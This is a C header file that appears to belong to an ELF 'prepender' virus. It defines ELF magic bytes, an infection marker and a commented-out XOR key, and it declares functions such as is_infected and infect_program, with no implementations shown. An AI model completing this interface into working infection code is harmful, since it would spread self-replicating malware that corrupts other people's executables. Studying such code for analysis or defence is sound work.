#ifndef __PREPENDER_H
#define __PREPENDER_H "prepender.h"

#include <stdbool.h>

// Macros
#define bota(x) ((x)?"true":"false")
#define len(arr) (sizeof(arr)/sizeof(arr[0]))


#define __MAGIC (const unsigned char[]) {0x7F, 'E', 'L', 'F'}
#define __INFECTION_MARK (const unsigned char[]) {'^', 'F', 'K', 'D', '^'}
// #define __XOR_KEY "SomeXORKey"

typedef unsigned char byte;

bool is_elf(const char*);
bool is_infected(const char*);
byte* read_file(const char*);
unsigned int file_size(const char*);

void run_executable_file(const char*);
byte* get_execution_instructions(const char*);
void infect_program(const char*, const char*);

#endif
